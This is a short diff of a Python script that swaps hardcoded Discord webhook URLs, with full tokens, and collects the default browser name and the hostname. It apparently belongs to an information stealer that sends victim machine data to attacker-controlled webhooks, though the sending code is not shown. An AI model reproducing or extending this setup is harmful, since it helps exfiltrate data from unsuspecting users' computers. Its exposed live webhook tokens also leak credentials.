@@ -16,8 +16,8 @@ import time
 
 
 
-secondary_hook = "https://discord.com/api/webhooks/1310920050265555016/KvFlU6RU4lUdfSWh60HzwEYQ_aPL9D4PdRwT57JsHAAZKzMK2-5w0IfAST9D9cQYMARA"
-webhook_url = "https://discord.com/api/webhooks/1310920047304249425/kinK7Jc-pV9sRSwlapQT1TQ6d1Vwf_U5e02c4vfJgyGpxEgFo8xioMiZKsogF8heNNwa"
+secondary_hook = "https://discord.com/api/webhooks/1311280878550257686/uD4iPP_0KbePjP_jdoGu2kwlpwtV4S5SXW5047_ALQ6v7MyBhIAgTl3GJlDuyznyEueA"
+webhook_url = ""
 default = webbrowser.get()
 browser_name = default.name.split("/")[-1].split(".")[0]
 hostname = socket.gethostname()
